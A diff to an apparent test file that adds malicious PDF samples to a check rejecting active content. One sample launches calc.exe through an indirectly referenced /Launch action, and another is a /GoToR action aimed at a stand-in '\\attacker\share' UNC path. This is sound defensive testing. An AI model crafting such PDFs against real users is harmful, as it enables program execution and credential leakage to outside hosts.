@@ -282,6 +282,11 @@ def test_only_real_pdfs_without_active_content_are_stored(client, db, tmp_path):
     for bad in (
         make_pdf(lambda w: _open_action(w, {"/S": "/JavaScript", "/JS": "app.alert('hi')"})),
         make_pdf(lambda w: _open_action(w, {"/S": "/Launch", "/F": "calc.exe"})),
+        # /S as an indirect reference: viewers resolve it, so the check must too.
+        make_pdf(lambda w: w._root_object.__setitem__(NameObject("/OpenAction"), DictionaryObject(
+            {NameObject("/S"): w._add_object(NameObject("/Launch")), NameObject("/F"): TextStringObject("calc.exe")}
+        ))),
+        make_pdf(lambda w: _open_action(w, {"/S": "/GoToR", "/F": "\\\\attacker\\share\\x.pdf"})),
         make_pdf(lambda w: w.add_attachment("run.exe", b"MZ")),
         make_pdf(lambda w: w.encrypt("secret")),
     ):
